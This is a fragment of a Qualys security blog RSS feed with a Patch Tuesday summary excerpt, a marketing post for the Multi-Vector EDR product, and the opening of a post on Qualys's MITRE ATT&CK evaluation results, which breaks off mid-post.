<p><a href="https://blog.qualys.com/author/bharat_jogi">Bharat Jogi</a>, <strong>Director, Vulnerability and Threat Research, Qualys</strong></p>



<p></p>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/04/12/april-2022-patch-tuesday/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Solution Architect, Subject Matter Expert (SA/SME) Dashboards and Reporting]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/f30c2cfc860943679f450ee84562461e?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/dmfezzareed]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<h2><strong>Microsoft Patch Tuesday Summary</strong></h2>



<p class="has-text-align-justify">Microsoft has fixed 145&nbsp;vulnerabilities, including 17 Microsoft Edge vulnerabilities, in the April 2022 update, with ten (10) classified as <strong><em>Critical</em></strong> as they allow Remote Code Execution (RCE). This month’s Patch Tuesday release includes fixes for two (2) zero-day vulnerabilities as well, one (1) known to be actively exploited (<a rel="noreferrer noopener" href="http://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-24521" data-type="URL" data-id="http://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-24521" target="_blank">CVE-2022-24521</a>) and the other to be publicly exposed (<a rel="noreferrer noopener" href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-26904" target="_blank">CVE-2022-26904</a>).</p>



<p class="has-text-align-justify">Microsoft has fixed several problems in their software, including Denial of Service, Elevation of Privilege, Information Disclosure, Remote Code Execution, and Spoofing vulnerabilities.</p>



]]></customExcerpt>
    </item>
    <item>
      <title>EDR Is Dead. Long Live Multi-Vector EDR.</title>
      <link>https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr</link>
      <comments>https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr#respond</comments>
      <dc:creator><![CDATA[Hiep Dang]]></dc:creator>
      <pubDate>Mon, 04 Apr 2022 13:00:00 +0000</pubDate>
      <category><![CDATA[Product and Tech]]></category>
      <category><![CDATA[edr]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29775</guid>
      <description><![CDATA[News of EDR’s demise has been greatly exaggerated. Fact is: older approaches to EDR have to move over. There’s a new solution now: Multi-Vector EDR. This blog reviews the highlights of our latest release of this critically important app on the Qualys Cloud Platform.&#160; Although it now seems like a bygone era, there was once [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>News of EDR’s demise has been greatly exaggerated. Fact is: older approaches to EDR have to move over. There’s a new solution now: Multi-Vector EDR. This blog reviews the highlights of our latest release of this critically important app on the Qualys Cloud Platform.</em>&nbsp;</p>



<p>Although it now seems like a bygone era, there was once a time when anti-virus software was all the IT world needed to protect computers against viruses. Then in 2014, one of the largest anti-virus vendors infamously proclaimed in the<a href="https://www.pcmag.com/news/symantec-says-antivirus-is-dead-world-rolls-eyes#:~:text=Earlier%20this%20week%2C%20Symantec's%20senior,40%20percent%20of%20Symantec's%20revenue."> Wall Street Journal that “Antivirus is dead.”</a> Given that anti-virus is still one of the most ubiquitously used cybersecurity products to protect against known malware, it didn’t really die.&nbsp;&nbsp;</p>



<p>What died was the illusion of being able to keep our defenses up to speed with the pace of new malware. In the wake of abandoning all hope of prevention, traditional EDR (Endpoint Detection and Response) products would prefer to convince us that we should focus our time and efforts on being <em>reactive </em>instead, by detecting and responding as fast as we can.&nbsp;&nbsp;</p>



<p>Yet here in 2022, our malware infections have exploded into a full-blown global pandemic.&nbsp;&nbsp;</p>



<ul><li>With each passing year, we see a<a href="https://www.av-test.org/en/statistics/malware/"> record number of new malware</a>&nbsp;</li><li>Ransomware payouts are growing and turning some black hats into millionaires&nbsp;&nbsp;</li><li>2021 saw the<a href="https://nvd.nist.gov/general/visualizations/vulnerability-visualizations/cvss-severity-distribution-over-time"> highest number of vulnerabilities ever recorded</a>&nbsp;&nbsp;</li><li>The average time it takes to patch vulnerabilities has stretched to months, not weeks or days&nbsp;</li></ul>



<ul><li>Businesses are suffering a record number of data breaches&nbsp;&nbsp;</li><li>Billions of cumulative records have been compromised by those breaches&nbsp;&nbsp;</li><li>It takes the average company over<a href="https://www.ibm.com/downloads/cas/OJDVQGRY"> 6 months to identify a breach and almost 3 months to contain it</a>&nbsp;</li></ul>



<span id="more-29775"></span>



<p>Last December,<a href="https://www.forrester.com/blogs/edr-only-mostly-dead/"> Forrester Analyst Allie Mellen proclaimed that “EDR is mostly dead”,</a> indicating that the perpetual cycle of alert, detect, and respond has become a losing strategy in the fight against malware. To break out of the endless loop of incident response, we here at Qualys<a href="https://blog.qualys.com/product-tech/2021/05/03/the-convergence-of-endpoint-protection-with-detection-response"> previously discussed</a> the need to incorporate Prediction and Prevention with our Detection and Response process.&nbsp;&nbsp;&nbsp;</p>



<h3>Introducing Qualys Multi-Vector EDR 2.0&nbsp;</h3>



<div class="wp-block-image"><figure class="aligncenter size-full is-resized"><img data-attachment-id="29776" data-permalink="https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr/attachment/qualys-multi-vector-edr" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/qualys-multi-vector-edr.png" data-orig-size="824,824" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="qualys-multi-vector-edr" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/qualys-multi-vector-edr-300x300.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/qualys-multi-vector-edr.png" loading="lazy" src="https://blog.qualys.com/wp-content/uploads/2022/04/qualys-multi-vector-edr.png" alt="" class="wp-image-29776" width="412" height="412" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/qualys-multi-vector-edr.png 824w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/qualys-multi-vector-edr-300x300.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/qualys-multi-vector-edr-150x150.png 150w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/qualys-multi-vector-edr-768x768.png 768w" sizes="(max-width: 412px) 100vw, 412px" /></figure></div>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Webinar: Integrate VMDR with EDR to quickly reduce risk of compromise</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://event.on24.com/wcc/r/3722586/B79E0AD0D2C18830ED08E78C13A37F6E" style="background-color:#ed2e26">Register</a></div>



<hr class="wp-block-separator is-style-wide"/>



<p><a href="https://www.qualys.com/apps/endpoint-detection-response/">Qualys Multi-Vector EDR</a>’s newest major <a href="https://www.qualys.com/edr-2022-press-release">release</a> fulfills<a href="https://www.gartner.com/smarterwithgartner/build-adaptive-security-architecture-into-your-organization"> Gartner’s concept of Adaptive Security</a> by delivering the following benefits to enterprises, large or small:&nbsp;&nbsp;</p>



<ol><li><strong>Prioritize and focus on the most critical and urgent incidents.</strong> Multi-Vector EDR leverages the<a href="https://www.qualys.com/apps/global-assetview"> asset criticality score</a> tagged using<a href="https://www.qualys.com/apps/cybersecurity-asset-management/"> Qualys CSAM</a> to help your incident response teams prioritize its time and resources. Focus is placed on remediating threats that could have the biggest negative impact on your business.&nbsp;&nbsp;</li></ol>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29777" data-permalink="https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr/attachment/incident-asset-criticality" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Incident-Asset-Criticality.jpg" data-orig-size="2460,1384" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Incident-Asset-Criticality" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-1070x602.jpg" loading="lazy" width="1070" height="602" src="https://blog.qualys.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-1070x602.jpg" alt="" class="wp-image-29777" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-1070x602.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-768x432.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-1536x864.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Incident-Asset-Criticality-2048x1152.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<ol start="2"><li><strong>Prevent future attacks</strong> by eliminating vulnerabilities exploited by malware and prevent all other assets from the same attack. Unpatched vulnerabilities leave an open door for malware to successfully infect an endpoint and carry out its objectives. Multi-Vector EDR is natively integrated with<a href="https://www.qualys.com/apps/vulnerability-management-detection-response/"> Qualys VMDR</a>, allowing you to take a single malware incident, immediately pivot to identify all assets susceptible to the same exploit, and patch them all using<a href="https://www.qualys.com/apps/patch-management/"> Qualys Patch Management</a>.&nbsp;</li></ol>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29778" data-permalink="https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr/attachment/cve-correlation" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/cve-correlation.jpg" data-orig-size="2460,1389" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="cve-correlation" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/cve-correlation-300x169.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/cve-correlation-1070x604.jpg" loading="lazy" width="1070" height="604" src="https://blog.qualys.com/wp-content/uploads/2022/04/cve-correlation-1070x604.jpg" alt="" class="wp-image-29778" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/cve-correlation-1070x604.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/cve-correlation-300x169.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/cve-correlation-768x434.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/cve-correlation-1536x867.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/cve-correlation-2048x1156.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<ol start="3"><li><strong>Identify symptoms of an attack</strong> with Multi-Vector EDR’s<a href="https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation"> deep integration with the MITRE ATT&amp;CK framework</a>. The telemetry that is collected by endpoints is correlated and mapped directly to MITRE ATT&amp;CK Tactics and Techniques to provide rich context and meaningful insight into suspicious and malicious activities associated with an attack.&nbsp;</li></ol>



<figure class="wp-block-image alignwide size-large"><img src="https://blog.qualys.com/wp-content/uploads/2022/03/image_3-1070x526.png" alt=""/></figure>



<ol start="4"><li><strong>Consolidate Endpoint Agents – </strong>The Qualys Cloud Agent is a single unified endpoint agent that handles all your cybersecurity prevention, detection, and remediation needs. From asset details, malware protection, vulnerability assessment, compliance, and patching.</li></ol>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29779" data-permalink="https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr/attachment/multi-vector-edr-blog3-single-agent" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent.png" data-orig-size="1915,1386" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Multi-Vector-EDR-Blog3-Single-Agent" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-300x217.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-1070x774.png" loading="lazy" width="1070" height="774" src="https://blog.qualys.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-1070x774.png" alt="" class="wp-image-29779" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-1070x774.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-300x217.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-768x556.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent-1536x1112.png 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/Multi-Vector-EDR-Blog3-Single-Agent.png 1915w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<ol start="5"><li><strong>Gain visibility in depth and breadth</strong> &#8211; Like a microscope, Multi-Vector EDR provides deep insight into an endpoint to find the root cause of an infection. It shares its findings from endpoints to<a href="https://blog.qualys.com/product-tech/2022/02/08/introducing-qualys-context-xdr-the-difference-between-chaos-clarity"> Qualys Context XDR</a>, which acts as a wide-angle lens to provide the bigger picture view of an attack that spans multiple devices.</li></ol>



<figure class="wp-block-image alignwide size-large"><img data-attachment-id="29781" data-permalink="https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr/attachment/xdr-3" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/04/xdr.jpg" data-orig-size="2460,1538" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="xdr" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/04/xdr-300x188.jpg" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/04/xdr-1070x669.jpg" loading="lazy" width="1070" height="669" src="https://blog.qualys.com/wp-content/uploads/2022/04/xdr-1070x669.jpg" alt="" class="wp-image-29781" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/xdr-1070x669.jpg 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/xdr-300x188.jpg 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/xdr-768x480.jpg 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/xdr-1536x960.jpg 1536w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/04/xdr-2048x1280.jpg 2048w" sizes="(max-width: 1070px) 100vw, 1070px" /></figure>



<h3>The Power of Qualys Cloud Platform&nbsp;</h3>



<p>Multi-Vector EDR has been built natively on Qualys Cloud Platform. This allowed us to accelerate the development and deployment of this fresh take on EDR. This allows you and your enterprise to enjoy full cross-product correlation and seamless integration across our Cloud Apps to make Security Operations more productive and efficient. </p>



<p>Thanks to the power of our Platform, Qualys Multi-Vector EDR is the only solution in the industry that unifies multiple context vectors around asset criticality, vulnerabilities, and system misconfigurations associated with threats. It’s the only solution that recommends patching all your exposed assets as an important part of reducing mean-time-to-remediate (MTTR). It provides unparalleled threat analysis and automated threat response by assessing cyber threats according to MITRE ATT&amp;CK Tactics and Techniques combined with real-time endpoint telemetry. Even better, Qualys Multi-Vector EDR is easy to deploy, easy to use and easy to manage due to its single lightweight agent, cloud delivery, and unified dashboard.&nbsp;&nbsp;</p>



<p>As the saying goes, “an ounce of prevention is worth a pound of cure.” Traditional stand-alone EDR products solely focus on trying to respond faster, without helping their customers to mitigate their overall security risk and avoid future attacks. Traditional EDR and or legacy Endpoint Protection (EPP) solutions may soon be dead. It’s time to discover superior threat detection and response at a better value. </p>



<p><a href="https://event.on24.com/wcc/r/3722586/B79E0AD0D2C18830ED08E78C13A37F6E">Join our webinar on April 12th</a> where we will demonstrate all the new capabilities of Multi-Vector EDR!</p>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/product-tech/2022/04/04/edr-is-dead-long-live-multi-vector-edr/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/581cc272d623e7ea4cda9e240bc24907?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/hdang]]></authorPosts>
      <postCategory>
        <name><![CDATA[Product and Tech]]></name>
        <link><![CDATA[https://blog.qualys.com/category/product-tech]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>News of EDR’s demise has been greatly exaggerated. Fact is: older approaches to EDR have to move over. There’s a new solution now: Multi-Vector EDR. This blog reviews the highlights of our latest release of this critically important app on the Qualys Cloud Platform.</em>&nbsp;</p>



<p>Although it now seems like a bygone era, there was once a time when anti-virus software was all the IT world needed to protect computers against viruses. Then in 2014, one of the largest anti-virus vendors infamously proclaimed in the<a href="https://www.pcmag.com/news/symantec-says-antivirus-is-dead-world-rolls-eyes#:~:text=Earlier%20this%20week%2C%20Symantec's%20senior,40%20percent%20of%20Symantec's%20revenue."> Wall Street Journal that “Antivirus is dead.”</a> Given that anti-virus is still one of the most ubiquitously used cybersecurity products to protect against known malware, it didn’t really die.&nbsp;&nbsp;</p>



<p>What died was the illusion of being able to keep our defenses up to speed with the pace of new malware. In the wake of abandoning all hope of prevention, traditional EDR (Endpoint Detection and Response) products would prefer to convince us that we should focus our time and efforts on being <em>reactive </em>instead, by detecting and responding as fast as we can.&nbsp;&nbsp;</p>



<p>Yet here in 2022, our malware infections have exploded into a full-blown global pandemic.&nbsp;&nbsp;</p>



<ul><li>With each passing year, we see a<a href="https://www.av-test.org/en/statistics/malware/"> record number of new malware</a>&nbsp;</li><li>Ransomware payouts are growing and turning some black hats into millionaires&nbsp;&nbsp;</li><li>2021 saw the<a href="https://nvd.nist.gov/general/visualizations/vulnerability-visualizations/cvss-severity-distribution-over-time"> highest number of vulnerabilities ever recorded</a>&nbsp;&nbsp;</li><li>The average time it takes to patch vulnerabilities has stretched to months, not weeks or days&nbsp;</li></ul>



<ul><li>Businesses are suffering a record number of data breaches&nbsp;&nbsp;</li><li>Billions of cumulative records have been compromised by those breaches&nbsp;&nbsp;</li><li>It takes the average company over<a href="https://www.ibm.com/downloads/cas/OJDVQGRY"> 6 months to identify a breach and almost 3 months to contain it</a>&nbsp;</li></ul>



]]></customExcerpt>
    </item>
    <item>
      <title>Qualys Multi-Vector EDR Excels in 2022 MITRE ATT&amp;CK Evaluation </title>
      <link>https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation</link>
      <comments>https://blog.qualys.com/product-tech/2022/03/31/qualys-multi-vector-edr-excels-in-2022-mitre-attck-evaluation#respond</comments>
      <dc:creator><![CDATA[Travis Smith]]></dc:creator>
      <pubDate>Thu, 31 Mar 2022 23:34:08 +0000</pubDate>
      <category><![CDATA[Product and Tech]]></category>
      <category><![CDATA[edr]]></category>
      <category><![CDATA[MITRE ATT&CK]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29754</guid>
      <description><![CDATA[MITRE evaluated Qualys Multi-Vector EDR against competing alternatives, and the results are in. This blog reviews the basics of MITRE ATT&#38;CK evaluation, how our EDR solution performed, and how to interpret the ratings.&#160; MITRE Engenuity has released the results of round 4 of its ATT&#38;CK Evaluations based on the Wizard Spider and Sandworm APT Groups. [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p><em>MITRE evaluated Qualys Multi-Vector EDR against competing alternatives, and the results are in. This blog reviews the basics of MITRE ATT&amp;CK evaluation, how our EDR solution performed, and how to interpret the ratings.</em>&nbsp;</p>



<p><a href="https://attackevals.mitre-engenuity.org/">MITRE Engenuity</a> has released the <a href="https://attackevals.mitre-engenuity.org/enterprise/participants/qualys?view=overview&amp;adversary=wizard-spider-sandworm">results</a><mark style="background-color:rgba(0, 0, 0, 0)" class="has-inline-color has-vivid-red-color"> </mark>of<a href="https://attackevals.mitre-engenuity.org/enterprise/wizard-spider-and-sandworm/"> round 4 of its ATT&amp;CK Evaluations</a> based on the Wizard Spider and Sandworm APT Groups. With the release of<a href="https://www.qualys.com/apps/endpoint-detection-response/"> Qualys Multi-Vector EDR</a> in late 2020, we were able to fully participate in this year’s evaluation. MITRE’s latest ratings clearly show that Qualys can detect, analyze, and alert attacks throughout the entire chain of attack.&nbsp;</p>



<p>Bottom line: Qualys Multi-Vector EDR successfully detected MITRE’s simulated adversary all throughout the attack chain.</p>



<p><strong>Overall, our solution detected 100% of the tested steps and&nbsp;returned 74% visibility into the entire attack chain. </strong>This is independent third-party verification that Qualys Multi-Vector EDR doesn’t overburden security teams with mountains of data to churn through, while accurately detecting attacks.&nbsp;</p>



<p>What’s more, our EDR solution enriches events using MITRE ATT&amp;CK Tactics in addition to MITRE ATT&amp;CK Techniques, something other EDR products simply do not do.&nbsp;</p>



<span id="more-29754"></span>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Webinar: Integrate VMDR with EDR to quickly reduce risk of compromise</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://event.on24.com/wcc/r/3722586/B79E0AD0D2C18830ED08E78C13A37F6E" style="background-color:#ed2e26">Register</a></div>



<hr class="wp-block-separator is-style-wide"/>



<p>Let’s review the MITRE methodology and our rating in more detail.</p>



<h3>About the MITRE ATT&amp;CK Evaluation&nbsp;</h3>



<p>For the last four years, the MITRE Engenuity team has run a vendor evaluation program that tests security vendors against attacks based on real-world advanced persistent threat (APT) groups. In previous years the attacks were based off groups such as APT3, APT29, and Carbanak+Fin7. This year the tests were based off the Wizard Spider and Sandworm teams, which were prolific in deploying ransomware in 2016 and 2019, respectively.&nbsp;&nbsp;&nbsp;</p>



<p>Security vendors were invited to participate in this curated evaluation. Prior to the testing, a virtual environment was provided and Qualys installed our suite of Cloud Apps and configured it appropriately.&nbsp;&nbsp;</p>



<p>The main part of the evaluation focused on detecting the various attacks, with any mitigating technologies turned off. Many of the tools used throughout the attack are well-known hacking tools such as Mimikatz, which most endpoint solutions will detect and block. MITRE is more interested in the effectiveness of detections and mapping to MITRE ATT&amp;CK classifications rather than blocking commodity malware.&nbsp;&nbsp;</p>



<p>The testing itself was split into multiple days where the Engenuity team acted as the red team attackers, while Qualys acted as the blue team defenders. Historically the tests themselves have been broken down into two days to either test using different attacker toolsets or to emulate a different adversary.&nbsp;&nbsp;</p>



<p>For example, this year day one was dedicated to Wizard Spider while the second was dedicated to Sandworm. For each day of testing, the Engenuity team broke down the attack into ten high-level stages, with each stage containing multiple sub-steps within it. Overall, there were 100 to 200 individual sub-steps during which the Engenuity team was specifically looking for some type of detection.&nbsp;&nbsp;</p>



<p>The detections themselves were broken down into one of six categories:&nbsp;&nbsp;</p>



<ol><li><em>N/A</em> &#8211; specific to vendors like Qualys who did not deploy a Linux agent during the testing for that stage of the attack&nbsp;</li><li><em>None </em>&#8211; applied when the vendor had no insight into that specific event, which is common for high-volume events such as system API calls&nbsp;</li><li><em>Telemetry </em>– defined by MITRE as the first stage of Visibility and lays the groundwork for any detection the vendor would have. These are events which were collected but had no enrichment or detection applied to them.&nbsp;</li><li><em>General </em>– defined by MITRE as the first stage of Analytics, where the vendor created an alert but did not enrich it with any MITRE ATT&amp;CK mappings&nbsp;</li><li><em>Tactic </em>– first part of the MITRE ATT&amp;CK framework&nbsp;</li><li><em>Technique </em>– second part of the MITRE ATT&amp;CK framework&nbsp;</li></ol>



<p>Our overall goal was to collect evidence of the attacks and provide that to the Engenuity team for detection mapping.<em> </em>Categories 1-4 comprise how security products worked before ATT&amp;CK became the de-facto framework for describing attacker behaviors. As mentioned above, MITRE groups and publishes its results along two main categories, either Visibility or Analytics.&nbsp;&nbsp;</p>



<p>Aside from <em>N/A</em> and <em>None</em>, anything flagged in categories 3-6 is grouped as Visibility, meaning there is some level of insight into the attack. Categories 4-6 are grouped in the Analytics bucket. Categories 5 and 6 are what the MITRE team wants to see. Vendors should be enriching the events with the Tactics and Technique names based on the ATT&amp;CK framework. Ideally, most vendors want to find the right balance between collecting enough telemetry to detect attacks and providing quality alerts that are not overburdening users.&nbsp;</p>



<h3>Interpreting the Results&nbsp;</h3>



<p>The higher a vendor’s Visibility count, the more opportunities the product demonstrates to map events with an Analytic of either <em>General</em>, <em>Tactic</em>, or <em>Technique</em>.  </p>



<p>Think of it this way: Events which are marked as “visible” are the hay in the haystack, while the analytic events are the needles. By having a low analytic count, those products leave their users to their own devices to try and hunt for adversarial behaviors. On the other hand, products having too high of an analytic count can overburden users and lead to alert fatigue.&nbsp;</p>



<h3>Qualys Multi-Vector EDR Evaluation Results&nbsp;</h3>



<p>Viewing the results of this latest round of evaluations, Qualys Multi-Vector EDR successfully detected the simulated adversary throughout a majority of the attack chain, as previously reported. Our EDR solution detected 100% of the tested steps and&nbsp;returned 74% visibility into the entire attack chain.</p>



<p>Unlike many alternative EDR offerings, Qualys Multi-Vector EDR was tested in its default “out of the box” configuration state. The only exception was our Anti-Malware Engine, which was downgraded to “Audit-Only mode” (instead of Auto-Quarantine) to allow the threats to execute their malicious payloads for the purposes of the MITRE ATT&amp;CK evaluation. The result is superior protection without the configuration hassles of other EDR offerings.&nbsp;</p>



<p>Let’s review exactly how Qualys Multi-Vector EDR performed during the MITRE tests.&nbsp;&nbsp;</p>



<h3>Immediate Detection&nbsp;&nbsp;</h3>



<p>Digging deeper into the results, you can clearly see that Qualys Multi-Vector EDR provides insight immediately as soon as the malicious Word document was written to disk and executed.&nbsp;&nbsp;</p>



